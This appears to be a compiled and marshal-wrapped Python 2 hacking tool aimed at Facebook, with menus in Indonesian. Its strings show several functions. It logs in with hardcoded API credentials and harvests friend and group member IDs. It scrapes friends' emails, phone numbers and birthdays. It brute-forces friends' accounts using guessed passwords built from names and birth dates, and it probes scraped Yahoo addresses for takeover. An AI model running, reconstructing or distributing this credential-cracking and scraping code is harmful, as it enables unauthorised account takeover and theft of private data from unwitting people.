ó
«<]c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNsäz  c           @   sÉ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l m Z y d  d l Z Wn e k
 rÄ e  j d  n2 Xy d  d l Z Wn e k
 rõ e  j d  n Xd  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d	 d& g e _ d   Z d   Z d   Z d Z  d Z! g  Z" g  Z# g  Z$ g  Z% g  Z& g  Z' g  Z( g  Z) g  Z* g  Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 g  Z1 g  Z2 g  Z3 d Z4 d Z5 d   Z6 d   Z7 d   Z8 d   Z9 d   Z: d   Z; d   Z< d   Z= d   Z> d   Z? d   Z@ d   ZA d   ZB d    ZC d!   ZD d"   ZE d#   ZF d$   ZG eH d% k rÅe6   n  d S('   iÿÿÿÿN(   t
   ThreadPools   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;91m[!] Keluar(   t   ost   syst   exit(    (    (    s   <Ahmad_Riswanto>t   keluar   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   <Ahmad_Riswanto>t   jalan   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s&   [1;91m[+] [1;92mPlease Wait [1;97mi   (   R   R	   R   R   R   (   t   titikt   o(    (    s   <Ahmad_Riswanto>t   tik#   s
    sI   [1;36m ââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬à¹Û©Û©à¹â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â
 [1;31m _  _ _  _ _    ___ _ ___  ____ ____ ____ ____ ____
 [1;31m |\/| |  | |     |  | |__] |___ |  | |__/ |    |___
 [1;37m |  | |__| |___  |  | |__] |    |__| |  \ |___ |___
 [1;36m Â«------------------------â§â§-----------------------Â»
  [91m[[97m+[91m] [37mAuthor    : [92mTio Putra JK
  [91m[[97m+[91m] [37mFacebook  : [92mTio Evanka
  [91m[[97m+[91m] [37mGithub    : [92mhttps://github.com/tiocei    s   [31mNot Vulns	   [32mVulnc          C   s¼  t  j d  y t d d  }  t   Wnt t f k
 r·t  j d  t GHd GHd GHt d  } t j d  } t	   y t
 j d  Wn  t j k
 r® d	 GHt   n Xt t
 j _ t
 j d
 d  | t
 j d <| t
 j d <t
 j   t
 j   } d | k rYy)d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d  6d! d" 6} t j d#  } | j |  | j   } | j i | d$ 6 d% } t j | d& | } t j | j  }	 t d d'  }
 |
 j |	 d(  |
 j   t j  d) |	 d(  t! j" d*  t   WqYt j# j$ k
 rUd	 GHt   qYXn  d+ | k rd, GHt  j d-  t! j" d.  t   q¸d/ GHt  j d-  t! j" d.  t%   n Xd  S(0   Nt   resets	   login.txtt   rs:    [91m====================================================sS   [1;91m [1;92m             >> [34mLOGIN AKUN FACEBOOK [92m<<             [1;91ms+   [1;91m[+] [1;36mUsername [1;91m:[1;92m s+   [1;91m[+] [1;36mPassword [1;91m:[1;92m s   https://m.facebook.coms   
[1;91m[!] Tidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokensM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=i   t
   checkpoints'   
[1;91m[!] [1;93mAkun kena Checkpoints   rm -rf login.txti   s   
[1;91m[!] Login Gagal(&   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot	   raw_inputt   getpassR   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR
   t   closet   postR   R   t
   exceptionsR   t   login(   t   tokett   idt   pwdt   urlR)   t   datat   xt   aR   R   t   zedd(    (    s   <Ahmad_Riswanto>RL   D   sh    
S

c          C   sì  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n|Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnf t k
 rð t  j d  d
 GHt  j d  t j d  t   n# t j j k
 rd GHt   n Xt d  t j d  t  j d  t j	 d |   } t
 j | j  } x# | d D] } t j | d	  qgWt GHd GHd | GHd | GHd t t t   GHd GHd GHd GHd GHd GHd GHd GHd GHd GHHt   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameRN   s1   [1;91m[!] [1;93mSepertinya akun kena Checkpoints   [1;91m[!] Tidak ada koneksis   [1;91m[+] [1;93mLogin Suksesg¹?s3   https://graph.facebook.com/me/friends?access_token=RQ   s:    [91m====================================================s2                 [91m[[97m+[91m] [37m Name :[32ms1                 [91m[[97m+[91m] [37m ID :[32m s8                 [91m[[97m+[91m] [37m Jumlah ID :[32m s    [37m1. User Informations    [37m2. Hack Facebook Temans    [37m3. Ambil Id Temans    [37m4. Yahoo Checkers    [37m5. Liat Tanggal Lahirs    [37m6. Ambil Id grubs    [37m7. Logouts    [37m0. Exit(   R   R.   R/   t   readR2   R   R   RL   RD   RE   RF   RG   RH   R1   RK   R   R   R   t   idtmt   appendR3   t   strt   lent   pilih(   RM   t   otwRS   t   namaRN   t   jit   hat   c(    (    s   <Ahmad_Riswanto>R0   ~   s\    


		c          C   sü   t  d  }  |  d k r' d GHt   nÑ |  d k r= t   n» |  d k rS t   n¥ |  d k ri t   n |  d k r t   ny |  d k r t   nc |  d	 k r« t   nM |  d
 k rÎ t j	 d  t
   n* |  d k rä t
   n d |  d GHt   d  S(   Ns   [1;32mSelect âº[1;97m t    s   [1;91m[!] Jangan kosongR   t   2t   3t   4t   5t   6t   7s   rm -rf login.txtR%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R4   R[   t	   informasit   supert
   id_friendst
   menu_yahoot   getlahirt   lainR   R.   R   (   RT   (    (    s   <Ahmad_Riswanto>R[   °   s.    








c          C   s¯  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHt	 d  } t
 d	  t j d
 |   } t j | j  } xö| d D]Ô} | | d k sã | | d k r½ t j d | d d |   } t j | j  } d d GHy d | d GHWn t k
 rFd GHn7Xy d | d GHWn t k
 rpd GHn­ Xy d | d GHWn t k
 rd GHnY Xy d | d GHWn t k
 rÄd GHn Xy d | d d GHWn t k
 ròd GHn Xy d | d  GHWn t k
 rd! GHn XyL d" GHx@ | d# D]4 } y d$ | d% d GHWq0t k
 rcd& GHq0Xq0WWn t k
 r|n Xt	 d'  t   q½ q½ Wd( GHt	 d'  t   d  S()   Nt   clears	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================s@   [1;91m[+] [1;92mMasukan ID[1;97m/[1;92mNama[1;91m : [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s3   https://graph.facebook.com/me/friends?access_token=RQ   RU   RN   s   https://graph.facebook.com/s   ?access_token=i(   s
   [1;97mâs+   [1;91m[â¹] [1;92mNama[1;97m          : s9   [1;91m[?] [1;92mNama[1;97m          : [1;91mTidak adas+   [1;91m[â¹] [1;92mID[1;97m            : s9   [1;91m[?] [1;92mID[1;97m            : [1;91mTidak adas+   [1;91m[â¹] [1;92mEmail[1;97m         : R   s9   [1;91m[?] [1;92mEmail[1;97m         : [1;91mTidak adas+   [1;91m[â¹] [1;92mNomor HP[1;97m      : t   mobile_phones9   [1;91m[?] [1;92mNomor HP[1;97m      : [1;91mTidak adas+   [1;91m[â¹] [1;92mLokasi[1;97m        : t   locations9   [1;91m[?] [1;92mLokasi[1;97m        : [1;91mTidak adas+   [1;91m[â¹] [1;92mTanggal Lahir[1;97m : t   birthdays9   [1;91m[?] [1;92mTanggal Lahir[1;97m : [1;91mTidak adas+   [1;91m[â¹] [1;92mSekolah[1;97m       : t	   educations#   [1;91m                   ~ [1;97mt   schools,   [1;91m                   ~ [1;91mTidak adas!   
[1;91m[ [1;97mKembali [1;91m]s%   [1;91m[â] Pengguna tidak ditemukan(   R   R.   R/   RV   R2   R   R   RL   R3   R4   R   RD   RE   RF   RG   RH   R1   R0   (   RM   RN   R   t   cokt   pR   t   q(    (    s   <Ahmad_Riswanto>Rh   Ò   st    
 							

c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHt
   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================s(   [1;91m[[32m1[91m][1;34m Daftar Temans1   [1;91m[[32m2[91m][1;34m Daftar Teman Ke temans'   [1;91m[[32m3[91m][1;34m Member Grups+   [1;91m[[32m4[91m][1;34m Crack from Files#   [1;91m[[32m0[91m][1;31m Kembali(   R   R.   R/   RV   RM   R2   R   R   RL   R3   t   pilih_super(    (    (    s   <Ahmad_Riswanto>Ri     s"    c          C   sã  t  d  }  |  d k r' d GHt   n |  d k r¢ t j d  t GHd GHt d  t j d t  } t	 j
 | j  } xË| d	 D] } t j | d
  q Wn¥|  d k rt j d  t GHd GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r8d GHt  d  t   n Xt j d | d t  } t	 j
 | j  } xÞ| d	 D] } t j | d
  qqWn¸|  d k r"t j d  t GHd GHyC t  d  } x0 t | d  j   D] }	 t j |	 j    q×WWqGt k
 rd GHt  d  t   qGXn%|  d k rt j d  t GHd GHt  d  }
 y> t j d |
 d t  } t	 j
 | j  } d | d GHWn' t k
 r¸d GHt  d  t   n Xt j d |
 d t  } t	 j
 | j  } x^ | d  d	 D]! } t j | d
  | d } qõWn* |  d! k r3t   n d" |  d# GHt   d$ t t t   GHd% d& d' g } x0 | D]( } d( | Gt j j   t j d)  qrWHd GHd*   } t d+  } | j | t  d, GHt  d  t   d  S(-   Ns   [1;32mSelect âº[1;97m Ra   s   [1;91m[!] Jangan kosongR   R   s:    [91m====================================================s(   [1;91m[+][1;32m Mengambil id teman ...s3   https://graph.facebook.com/me/friends?access_token=RQ   RN   Rc   s4   [1;91m[+] [1;92mMasukan ID Grup   [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m RU   s   [1;91m[!] Grup tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]s   https://graph.facebook.com/s3   /members?fields=name,id&limit=9999999&access_token=Rd   s+   [1;91m[+] [1;92mFile ID  [1;91m: [1;97mR   s   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m]Rb   s/   [1;91m[+] [1;92mID Friends   [1;91m:[1;97m s   ?access_token=s?   [1;91m[[1;96mâ[1;91m] [1;92mName Friends [1;91m:[1;97m s   [1;91m[!] Friends not founds)   ?fields=friends.limit(5000)&access_token=t   friendsR%   s   [1;91m[â] [1;97ms    [1;91mTidak adas7   [1;91m[+] [1;92mID Berhasil Di Ambil [1;91m: [1;97ms   .   s   ..  s   ... s'   [1;91m[+] [1;92mPlease Wait [1;97mi   c         S   s­  |  } yt  j d | d t  } t j | j  } d } t j d | d | d  } t j |  } d | k r d | d	 | d
 | d GHnd | d k rÆ d | d	 | d
 | d GHnØd } t j d | d | d  } t j |  } d | k r&d | d	 | d
 | d GHnxd | d k rVd | d	 | d
 | d GHnH| d d } t j d | d | d  } t j |  } d | k r¾d | d	 | d
 | d GHnàd | d k rîd | d	 | d
 | d GHn°| d }	 t j d | d |	 d  } t j |  } d | k rRd | d	 |	 d
 | d GHnLd | d k rd | d	 |	 d
 | d GHn| d d }
 t j d | d |
 d  } t j |  } d | k rêd | d	 |
 d
 | d GHn´d | d k rd | d	 |
 d
 | d GHn| d d } t j d | d | d  } t j |  } d | k rd | d	 | d
 | d GHnd | d k r²d | d	 | d
 | d GHnì| d d } t j d | d | d  } t j |  } d | k rd | d	 | d
 | d GHnd | d k rJd | d	 | d
 | d GHnT| d | d } | j	 d d  } t j d | d | d  } t j |  } d | k rÈd | d	 | d
 | d GHnÖ d | d k rød | d	 | d
 | d GHn¦ | d } | j	 d d  } t j d | d | d  } t j |  } d | k rnd | d	 | d
 | d GHn0 d | d k rd | d	 | d
 | d GHn  Wn n Xd  S(   Ns   https://graph.facebook.com/s   /?access_token=t   sayangs   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R,   s   [1;97m[[1;92mOKâ[1;97m] s    | s    ==> RU   s   www.facebook.comt	   error_msgs   [1;97m[[1;93mCPâ[1;97m] t   Doraemons!   [1;91m[[1;92mOK[91m][0m[36m s"   [1;91m[[1;93mCP+[91m][0m[36m t
   first_namet   123t	   last_namet   12345Rq   t   /Ra   (
   RD   RE   RM   RF   RG   RH   t   urllibt   urlopent   loadt   replace(   t   argt   userRS   t   bt   pass1RQ   Rv   t   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   lahirt   pass8t   pass9(    (    s   <Ahmad_Riswanto>t   main  s          
          
 $i   s   
[1;91m[+] [1;97mSelesai(   R4   Rw   R   R.   R3   R   RD   RE   RM   RF   RG   RH   RN   RX   R1   Ri   R/   t	   readlinest   stripR2   R0   RY   RZ   R   R	   R   R   R   R    t   map(   t   peakR   R   t   st   idgt   aswt   ret   it   idlistt   linet   idtR]   R   R   R   Ru   (    (    s   <Ahmad_Riswanto>Rw   .  s    





	[
c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n-Xy´ t  j d  t GHd GHt	 j
 d |   } t j | j  } t d	  d
 GHxB | d D]6 } t j | d  d | d GHd | d GHd
 GHq¹ Wd t t  GHt d  t   Wnu t k
 r=d GHt d  t   nO t t f k
 rid GHt d  t   n# t	 j j k
 rd GHt   n Xd  S(   NRn   s	   login.txtR   s   [1;91m[!] Token not founds   rm -rf login.txti   s:    [91m====================================================s3   https://graph.facebook.com/me/friends?access_token=s+    [1;91m[âº] [1;92mPlease wait [1;97m...s:    [97m====================================================RQ   RN   s   [1;92m Name[1;91m  :[1;97m RU   s   [1;92m ID   [1;91m : [1;97ms&   
[1;91m[+] [1;97mTotal ID [1;96m%ss   
[1;91m[ [1;97mBack [1;91m]s#   [1;91m[!] Error when creating files   [1;91m[!] Stoppeds   [1;91m[â] No connection(   R   R.   R/   RV   R2   R   R   RL   R3   RD   RE   RF   RG   RH   R   RN   RX   RZ   R4   R0   t   KeyboardInterruptt   EOFErrorRK   R   R   (   RM   R   R   t   ah(    (    s   <Ahmad_Riswanto>Rj   ã  sF    
	




c          C   s   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHHt	   d  S(   NRn   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================s    [37m1. From Friendss    [37m2. Friends from Friendss    [37m3. Member Grups    [37m4. From files    [31m0. Back(
   R   R.   R/   RV   R2   R   R   RL   R3   t   yahoo_pilih(   RM   (    (    s   <Ahmad_Riswanto>Rk   
  s$    c          C   s­   t  d  }  |  d k r' d GHt   n |  d k r= t   nl |  d k rS t   nV |  d k ri t   n@ |  d k r t   n* |  d k r t   n d	 |  d
 GHt   d  S(   Ns   [1;32mSelect âº[1;97m Ra   s   [1;91m[!] Jangan kosongR   Rb   Rc   Rd   R%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R4   R¢   t   yahoofriendst   yahoot   yahoomembert	   yahoolistR0   (   t   go(    (    s   <Ahmad_Riswanto>R¢     s     





c          C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  } y> t j d
 | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d | d t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d } | d }	 t j d | d t  }
 t j |
 j  } yù | d } t j d  } | j |  j   } d | k rÑt j d  t t j _ t j d  d  | t d! <t j   j   } t j d"  } y | j |  j   } Wn
 w{n Xd# | k rÑ| j  | d$  d% | d& |	 GHt! j |  qÑn  Wq{t k
 råq{Xq{Wd d GHd' GHd( GH| j"   t d  t   d  S()   NR   s	   login.txtR   s   [!] Token tidak ditemukans   rm -rf login.txtg{®Gáz?t   outi    s   [+] Masukkan ID group : s%   https://graph.facebook.com/group/?id=s   &access_token=s   [+] Nama Grup : RU   s   [!] Group tidak ditemukans	   
[ Back ]s   [+] Mengambil Email Grup ...s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=s   GrupVuln.txtR+   s   [+] Mulai ...i(   s
   [1;97mâRQ   i   RN   s   ?access_token=R   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR   t   usernames$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s	   [ VULN ] s    = t   Dones   +] Tersimpan :GrupVuln.txt(#   R   R.   R/   RV   RM   R2   R   R   RL   t   mkdirt   OSErrorR3   R4   RD   RE   RF   RG   RH   R1   Rk   R   RX   R   t   compilet   searcht   groupR6   R9   R:   R;   R<   R>   R
   t   berhasilRI   (   t   mpsht   jmlRN   R   R   t   temant   kimakt   saveR+   R]   t   linksR   t   mailR¤   R\   t   klikt   jokt   pek(    (    s   <Ahmad_Riswanto>R¥   2  s    


	




	

c          C   s   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHt	 d	  t
   d  S(
   NRn   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================s    Segera hadirs#   [34m[[33;1m/[34m] [0;1mBack >> (   R   R.   R/   RV   R2   R   R   RL   R3   R4   Rk   (   RM   (    (    s   <Ahmad_Riswanto>R¤   y  s    
c          C   s²  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHg  } d } t	 d	  t
 j d
 |   } t j | j  } t d d  } d d GHx¼| d D]°} | d 7} | j |  | d } | d } t
 j d | d |   }	 t j |	 j  }
 y>|
 d } t j d  } | j |  j   } d | k rpt j d  t t j _ t j d d  | t d <t j   j   } t j d  } y | j |  j   } Wn d | d t d GHwÕ n Xd | k rX| j | d  d d GHd  | GHd! | GHd" | d# t d GHd d GHqpd | d t d GHn  WqÕ t k
 rqÕ XqÕ Wd$ GHd% GH| j   t d&  t    d  S('   NRn   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================i    s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   MailVuln.txtR+   i(   s
   [1;97mâRQ   RN   RU   s   https://graph.facebook.com/s   ?access_token=R   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR   R©   s$   "messages.ERROR_INVALID_USERNAME">.*s*   [1;91m[â] [1;92mEmail [1;91m:[1;91m s    [1;97m[[1;92ms   [1;97m]s"   "messages.ERROR_INVALID_USERNAME">s   
s8   [1;91m[[1;96mâ[1;91m] [1;92mNama  [1;91m:[1;97m s*   [1;91m[â¹] [1;92mID    [1;91m:[1;97m s*   [1;91m[â¹] [1;92mEmail [1;91m:[1;97m s	    [[1;92ms   
[1;91m[+] [1;97mSelesais8   [1;91m[+] [1;97mTersimpan [1;91m:[1;97m MailVuln.txts!   
[1;91m[ [1;97mKembali [1;91m](!   R   R.   R/   RV   R2   R   R   RL   R3   R   RD   RE   RF   RG   RH   RX   R   R­   R®   R¯   R6   R9   R:   R;   R<   R>   t   vulnotR
   t   vulnR1   RI   R4   Rk   (   RM   R±   R²   R³   R´   Rµ   R+   RN   R]   R¶   R   R·   R¤   R\   R¸   R¹   Rº   (    (    s   <Ahmad_Riswanto>R£     sp    
	




			

c          C   st  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nq Xt  j d  t GHd d GHt	 d	  } y t | d  } | j
   } Wn' t k
 rÏ d
 GHt	 d  t   n Xg  } d } t d  t d d  } d d GHd t d t d GHHt | d  j
   } x| D]} | j d d  } | d 7} | j |  t j d  } | j |  j   }	 d |	 k r0t j d  t t j _ t j d d  | t d <t j   j   }
 t j d  } y | j |
  j   } Wn d | GHq0n Xd | k r;| j | d  d | GHqGd | GHq0q0Wd GHd GH| j   t	 d  t   d  S(    NRn   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs'   [1;91m[+] [1;92mFile [1;91m: [1;97ms   [1;91m[!] File tidak adas!   
[1;91m[ [1;97mKembali [1;91m]i    s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   MailVuln.txtR+   s5   [1;91m[?] [1;97mStatus [1;91m:  [1;97mRed[[1;92ms   [1;97m]  Green[[1;92ms   [1;97m]s   
Ra   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR   R©   s$   "messages.ERROR_INVALID_USERNAME">.*s   [1;91m s"   "messages.ERROR_INVALID_USERNAME">s   [1;92m s   
[1;91m[+] [1;97mSelesais8   [1;91m[+] [1;97mTersimpan [1;91m:[1;97m MailVuln.txt(   R   R.   R/   RV   R2   R   R   RL   R3   R4   R   Rk   R   R»   R¼   R   RX   R   R­   R®   R¯   R6   R9   R:   R;   R<   R>   R
   RI   (   RM   t   filest   totalR·   R±   R²   Rµ   t   pwR¤   R\   R¸   R¹   Rº   (    (    s   <Ahmad_Riswanto>R¦   É  sl    	

	

	

c          C   s&  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   nÃ Xt  j d  t	 GHd GHd	 GHt
 j d
 t  }  t j |  j  } xh | d D]\ } t
 j d | d d t  } t j | j  } y d | d | d f GHWq¬ q¬ Xq¬ Wd GHt d  t   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   Rn   s:    [91m====================================================s(    [91m[[97m+[91m] [37mPliss Tunggu !!s3   https://graph.facebook.com/me/friends?access_token=RQ   s   https://graph.facebook.com/RN   s   ?access_token=sA    [91m[[97m+[91m] [32mNama [37m: %s => [32mTanggal [37m: %sRU   Rq   s    [+] Succesfulys!   
[1;91m[ [1;97mKembali [1;91m](   R   R.   R/   RV   RM   R2   R   R   RL   R3   RD   RE   RF   RG   RH   R4   R0   (   t   kukt   pult   jsonmt   byt   hek(    (    s   <Ahmad_Riswanto>Rl     s0     
c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHt
   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================s(   [1;91m[[32m1[91m][1;34m Liat Id Grubs)   [1;91m[[32m2[91m][1;34m Ambil Id Grubs#   [1;91m[[32m0[91m][1;34m Kembali(   R   R.   R/   RV   RM   R2   R   R   RL   R3   t   Grub(    (    (    s   <Ahmad_Riswanto>Rm   !  s    c          C   sm   t  d  }  |  d k r' d GHt   nB |  d k r= t   n, |  d k rS t   n |  d k ri t   n  d  S(   Ns   [1;32mSelect âº[1;97m Ra   s   [1;91m[!] Jangan kosongR   Rb   R%   (   R4   RÅ   t   grupsayat   id_member_grupR0   (   R   (    (    s   <Ahmad_Riswanto>RÅ   4  s    


c          C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   nXt  j d  t	 GHd GHt
 d  d GHyË t j d	 t  }  t j |  j  } xz | d
 D]n } | d } | d } t d d  } t j |  | j | d  d t |  GHd t |  GHd d GHq¹ Wd t t  GHd GHt d  t   Wn¨ t t f k
 rd GHt d  t   n| t k
 r³t  j d  d GHt d  t   nI t j j k
 rÕd GHt   n' t k
 rûd GHt d  t   n Xd  S(   NRn   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================s/    [1;91m[âº] [1;92mTunggu sebentar [1;97m...s2   https://graph.facebook.com/me/groups?access_token=RQ   RU   RN   s
   grupid.txtR+   s   
s8   [1;91m[[1;96mâ[1;91m] [1;92mNama  [1;91m:[1;97m s(   [1;91m[+] [1;92mID    [1;91m:[1;97m i(   s   [1;97m=s)   
[1;91m[+] [1;97mJumlah Grup [1;96m%ss6   [1;91m[+] [1;97mTersimpan [1;91m: [1;97mgrupid.txts!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] Terhentis   [1;91m[!] Grup tidak ditemukans   [1;91m[â] Tidak ada koneksis&   [1;91m[!] Kesalahan saat membuat file(   R   R.   R/   RV   RM   R2   R   R   RL   R3   R   RD   RE   RF   RG   RH   t   listgrupRX   R
   RY   RZ   R4   Rm   R   R    R1   t   removeRK   R   R   (   t   uht   gudRu   R]   RN   t   f(    (    s   <Ahmad_Riswanto>RÆ   A  sZ    









c             s-  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   nÊXyt  j d  t	 GHd GHt
 d   y> t j d	  d
 t  }  t j |  j  } d | d GHWn' t k
 rí d GHt
 d  t   n Xt
 d  } t | d    t d  d d GH   f d        f d   } |   d t t  GHd | GH  j   t
 d  t   Wn¨ t k
 r§d GHt
 d  t   n t t f k
 rÓd GHt
 d  t   nV t k
 rt  j |  d GHt
 d  t   n# t j j k
 r(d GHt   n Xd  S(   NRn   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s:    [91m====================================================s*   [1;91m[+] [1;92mID grup [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m RU   s   [1;91m[!] Grup tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]sC   [1;91m[+] [1;97mSimpan File [1;97mext(file.txt) [1;91m: [1;97mR+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...i4   s
   [1;97mâc            s   t  j |   } t j | j  } | d } x8 | d D], } t j | d    j | d d  q6 W| j d  d  k	 r  | j d   n  d  S(   Nt   pagingRQ   RN   s   
t   next(	   RD   RE   RF   RG   RH   t   idmemRX   R
   t   None(   t   next_urlt   next_dump_apit   next_result_jsont	   next_paget   ni(   R   t	   next_dump(    s   <Ahmad_Riswanto>RÖ     s    
c             s¡   t  j d  d t  }  t j |  j  } | d } x8 | d D], } t j | d    j | d d  qB W| j d  d  k	 r  | j d   n  d  S(   Ns   https://graph.facebook.com/s8   /members?fileds=id&limit=5000&summary=true&access_token=RÍ   RQ   RN   s   
RÎ   (
   RD   RE   RM   RF   RG   RH   RÏ   RX   R
   RÐ   (   t   dump_apit   result_jsont   pageR   (   R   RN   RÖ   (    s   <Ahmad_Riswanto>t   dump  s    
s'   
[1;91m[+] [1;97mJumlah ID [1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   R.   R/   RV   RM   R2   R   R   RL   R3   R4   RD   RE   RF   RG   RH   R1   Rm   R   RZ   RÏ   RI   R   R    RÉ   RK   R   R   (   R   R   t   simgRÚ   (    (   R   RN   RÖ   s   <Ahmad_Riswanto>RÇ   t  sb    

		







t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(I   R   R   R   t   datetimet   randomR@   R   t	   threadingRF   R5   R   t   multiprocessing.poolR    R7   t   ImportErrorR.   RD   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR6   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R3   t   backt   threadsR°   t   cekpointt   gagalt   idtemant   idfromtemanRÏ   RN   RW   t   emt   emfromtemant   hpt   hpfromtemant   reaksit
   reaksigrupt   koment	   komengrupRÈ   R»   R¼   RL   R0   R[   Rh   Ri   Rw   Rj   Rk   R¢   R¥   R¤   R£   R¦   Rl   Rm   RÅ   RÆ   RÇ   t   __name__(    (    (    s   <Ahmad_Riswanto>t   <module>   s|   
				:	2	"	F		µ	'			G		?	=				3	N(   t   marshalt   loads(    (    (    s   com-2.pyt   <module>   s   